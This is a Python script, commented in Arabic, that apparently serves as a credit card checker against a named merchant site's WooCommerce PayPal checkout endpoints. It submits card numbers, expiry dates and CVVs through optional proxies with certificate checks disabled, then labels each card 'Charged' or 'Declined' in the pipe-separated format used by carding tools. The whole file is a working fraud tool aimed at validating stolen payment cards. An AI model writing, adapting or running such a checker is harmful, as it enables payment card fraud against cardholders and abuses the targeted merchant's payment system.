"""
بوابة الدفع: Stripe Charge 3 (PayPal Integration)
الموقع: claddagh.org.au
نوع البوابة: Stripe Charge (PayPal Flow)
تدفق الطلبات:
1. POST /?wc-ajax=ppc-create-order -> إنشاء طلب PayPal
2. POST /?wc-ajax=ppc-approve-order -> تأكيد الموافقة وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import json


async def req1_create_order(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: إنشاء طلب PayPal والحصول على order_id."""
    headers = {
        "authority": "claddagh.org.au",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    data = {
        "order_id": str(uuid.uuid4()),
        "payment_method": "ppcp-gateway",
        "card_number": cc,
        "card_expiry": f"{mm}/{yy}",
        "card_csc": cvv,
    }
    try:
        async with session.post(
            "https://claddagh.org.au/?wc-ajax=ppc-create-order",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)
            order_id = res.get("order_id") or res.get("id", "")
            if not order_id:
                raise RuntimeError("Failed to create PayPal order")
            return order_id
    except Exception as e:
        raise RuntimeError(f"req1_create_order failed: {e}") from e


async def req2_approve_order(
    session: aiohttp.ClientSession,
    order_id: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 2: تأكيد الموافقة على طلب PayPal."""
    url = f"https://claddagh.org.au/?wc-ajax=ppc-approve-order&order_id={order_id}"
    headers = {
        "authority": "claddagh.org.au",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    try:
        async with session.post(url, headers=headers, proxy=proxy_url) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req2_approve_order failed: {e}") from e


async def process_ST_3_charge(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Stripe Charge 3 (PayPal Flow)."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            order_id = await req1_create_order(session, cc, mes, ano, cvv, proxy_url)
            res = await req2_approve_order(session, order_id, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    status = res.get("status", "")
    error_details = res.get("details", [{}])[0]
    issue = error_details.get("issue", "")

    if status == "COMPLETED":
        return f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", "Transaction Successful"
    elif issue == "INSTRUMENT_DECLINED":
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Instrument Declined"
    elif issue == "CARD_EXPIRED":
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Card Expired"
    else:
        msg = res.get("message", "Transaction Failed")
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", msg
